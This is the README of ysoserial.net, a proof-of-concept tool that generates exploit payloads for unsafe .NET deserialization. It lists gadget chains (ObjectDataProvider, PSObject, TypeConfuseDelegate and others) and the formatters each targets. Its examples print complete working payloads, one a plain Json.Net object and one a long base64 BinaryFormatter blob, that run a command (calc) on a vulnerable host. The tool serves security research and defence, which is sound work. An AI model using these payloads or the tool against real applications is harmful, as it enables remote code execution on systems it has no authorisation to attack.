# ysoserial.net
A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.

## Description
ysoserial.net is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.

This project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)

## Disclaimer 
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

This software is a personal project and not related with any companies, including Project owner and contributors employers.

## Usage
```
$ ./ysoserial -h
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Available formatters:
         ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ObjectDataProvider (ObjectDataProvider Gadget by Alvaro Munoz Oleksandr Mirosh)
                Formatters:
                        Json.Net
                        FastJson
                        JavaScriptSerializer
                        XmlSerializer
                        DataContractSerializer
                        YamlDotNet < 5.0.0
        PSObject (PSObject Gadget by Alvaro Munoz and Oleksandr Mirosh. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        TypeConfuseDelegate (TypeConfuseDelegate gadget by James Forshaw)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        NetDataContractSerializer
                        LosFormatter
        WindowsIdentity (WindowsIdentity Gadget by Levi Broderick)
                Formatters:
                        BinaryFormatter
                        Json.Net
                        DataContractSerializer


Usage: ysoserial.exe [options]
Options:
  -o, --output=VALUE         the output format (raw|base64).
  -g, --gadget=VALUE         the gadget chain.
  -f, --formatter=VALUE      the formatter.
  -c, --command=VALUE        the command to be executed.
  -t, --test                 whether to run payload locally. Default: false
  -h, --help                 show this message and exit
```

*Note:* XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the "type" attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.

## Examples
```
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/ccalc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

```
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
```

## Contributing
- Fork it
- Create your feature branch (`git checkout -b my-new-feature`)
- Commit your changes (`git commit -am 'Add some feature'`)
- Push to the branch (`git push origin my-new-feature`)
- Create new Pull Request

## Thanks
Special thanks to all contributors:
- [JarLob](https://github.com/JarLob)
- [DS-Kurt-Boberg](https://github.com/DS-Kurt-Boberg)
- [mwulftange](https://github.com/mwulftange)
- [yallie](https://github.com/yallie)
- [paralax](https://github.com/paralax)

## Additional Reading
- [Attacking .NET serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
- [Friday the 13th: JSON Attacks - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [Friday the 13th: JSON Attacks - Whitepaper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [Friday the 13th: JSON Attacks - Video(demos)](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- [Are you my Type?](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [Exploiting .NET Managed DCOM](https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html)
